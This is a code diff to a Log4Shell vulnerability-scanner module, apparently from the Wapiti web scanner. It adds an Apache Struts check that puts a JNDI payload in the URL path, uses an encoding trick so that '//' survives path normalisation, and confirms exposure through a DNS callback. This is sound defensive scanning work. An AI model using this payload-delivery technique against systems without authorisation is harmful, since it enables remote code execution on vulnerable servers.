@@ -62,7 +62,23 @@ class ModuleLog4Shell(Attack):
             return
         await self._verify_header_vulnerability(malicious_request, header_target, payload, payload_unique_id)
 
-    async def attack(self, request: Request):
+    async def _attack_apache_struts(self, request_url: str):
+        payload_unique_id = uuid.uuid4()
+
+        # Here we need to replace "//" by "$%7B::-/%7D/" because Apache Struts will replace "//" by "/"
+        # and with these special characters it will keep "//"
+        payload = self._generate_payload(payload_unique_id).replace("//", "$%7B::-/%7D/")
+
+        modified_request = Request(request_url + ("" if request_url.endswith("/") else "/") + payload + "/")
+
+        try:
+            await self.crawler.async_send(modified_request, follow_redirects=True)
+        except RequestError:
+            self.network_errors += 1
+            return
+        await self._verify_url_vulnerability(modified_request, payload_unique_id)
+
+    async def _attack_specific_cases(self, request: Request):
         root_url = await self.persister.get_root_url()
 
         if request.url == root_url:
@@ -74,7 +90,11 @@ class ModuleLog4Shell(Attack):
                 link_depth=request.link_depth
             )
             await self.attack_vsphere_url(vsphere_request)
+            await self._attack_apache_struts(request.url)
         await self.attack_vsphere_url(request)
+
+    async def attack(self, request: Request):
+        await self._attack_specific_cases(request)
         headers = await self.read_headers()
 
         batch_malicious_headers, headers_uuid_record = self._get_batch_malicious_headers(headers)
@@ -158,6 +178,26 @@ class ModuleLog4Shell(Attack):
             )
             log_red(modified_request.http_repr())
             log_red("---")
+
+    async def _verify_url_vulnerability(self, request: Request, param_uuid: uuid.UUID):
+        if not await self._verify_dns(str(param_uuid)):
+            return
+
+        await self.add_vuln_critical(
+            category=NAME,
+            request=request,
+            info=_("URL {0} seems vulnerable to Log4Shell attack") \
+                .format(request.url),
+            parameter=""
+        )
+
+        log_red("---")
+        log_red(
+            _("URL {0} seems vulnerable to Log4Shell attack"),
+            request.url
+        )
+        log_red(request.http_repr())
+        log_red("---")
 
     async def _verify_dns(self, header_uuid: str) -> bool:
         resolver = dns.resolver.Resolver(configure=False)
